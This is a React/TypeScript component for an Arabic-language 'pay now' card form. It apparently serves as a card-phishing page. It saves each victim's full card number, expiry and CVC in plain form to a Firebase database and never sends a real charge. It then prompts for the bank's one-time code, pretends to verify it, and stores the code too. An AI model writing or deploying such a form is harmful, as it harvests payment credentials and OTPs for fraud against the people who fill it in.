"use client"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Button } from "@/components/ui/button"
import { addDoc, collection, doc, updateDoc } from 'firebase/firestore'
import { db } from '@/lib/firebase'
import OTPForm from "./otp-form"

export default function PaymentForm() {
  const [cardNumber, setCardNumber] = useState("")
  const [cardName, setCardName] = useState("")
  const [expiryMonth, setExpiryMonth] = useState("")
  const [expiryYear, setExpiryYear] = useState("")
  const [cvc, setCvc] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showOTP, setShowOTP] = useState(false)
  const [paymentDocId, setPaymentDocId] = useState<string | null>(null)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    try {
      const paymentData = {
        cardNumber: cardNumber,
        cardName,
        expiryMonth,
        expiryYear,
        cvc,
        timestamp: new Date(),
        verified: false,
      }

      const docRef = await addDoc(collection(db, 'payments'), paymentData)
      setPaymentDocId(docRef.id)
      setShowOTP(true)
    } catch (error) {
      console.error("Error submitting payment:", error)
      alert("حدث خطأ أثناء إرسال الدفعة. يرجى المحاولة مرة أخرى.")
    } finally {
      setTimeout(() => {
        setIsSubmitting(false)
      }, 5000);
    }
  }

  const handleVerifyOTP = async (otp: string) => {
    if (!paymentDocId) {
      throw new Error("Payment document ID is missing")
    }

    // Here you would typically send the OTP to your backend for verification
    // For this example, we'll simulate a successful verification
    await new Promise(resolve => setTimeout(resolve, 5000))

    // Update the payment document to mark it as verified
    await updateDoc(doc(db, 'payments', paymentDocId), { verified: otp })
  }

  const isFormValid = cardNumber && cardName && expiryMonth && expiryYear && cvc

  if (showOTP) {
    return <OTPForm onVerify={handleVerifyOTP} />
  }

  return (
    <Card className="w-full max-w-md mx-auto rtl">
      <CardHeader>
        <CardTitle>تفاصيل الدفع</CardTitle>
        <CardDescription>يرجى إدخال معلومات الدفع الخاصة بك</CardDescription>
      </CardHeader>
      <form onSubmit={handleSubmit}>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <label htmlFor="cardNumber">رقم البطاقة</label>
            <Input
              id="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              required
              className="text-right"
            />
          </div>
          <div className="space-y-2">
            <label htmlFor="cardName">الاسم على البطاقة</label>
            <Input
              id="cardName"
              placeholder="محمد أحمد"
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              required
              className="text-right"
            />
          </div>
          <div className="grid grid-cols-3 gap-4">
            <div className="space-y-2">
              <label htmlFor="expiryMonth">شهر </label>
              <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                <SelectTrigger id="expiryMonth">
                  <SelectValue placeholder="الشهر" />
                </SelectTrigger>
                <SelectContent>
                  {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                    <SelectItem key={month} value={month.toString().padStart(2, "0")}>
                      {month.toString().padStart(2, "0")}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <label htmlFor="expiryYear">سنة </label>
              <Select value={expiryYear} onValueChange={setExpiryYear}>
                <SelectTrigger id="expiryYear">
                  <SelectValue placeholder="السنة" />
                </SelectTrigger>
                <SelectContent>
                  {Array.from({ length: 10 }, (_, i) => new Date().getFullYear() + i).map((year) => (
                    <SelectItem key={year} value={year.toString()}>
                      {year}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <label htmlFor="cvc">رمز الأمان</label>
              <Input
                id="cvc"
                placeholder="123"
                value={cvc}
                onChange={(e) => setCvc(e.target.value)}
                required
                maxLength={4}
                className="text-right"
              />
            </div>
          </div>
        </CardContent>
        <CardFooter>
          <Button type="submit" className="w-full" disabled={!isFormValid || isSubmitting}>
            {isSubmitting ? 'جارٍ الإرسال...' : 'ادفع الآن'}
          </Button>
        </CardFooter>
      </form>
    </Card>
  )
}

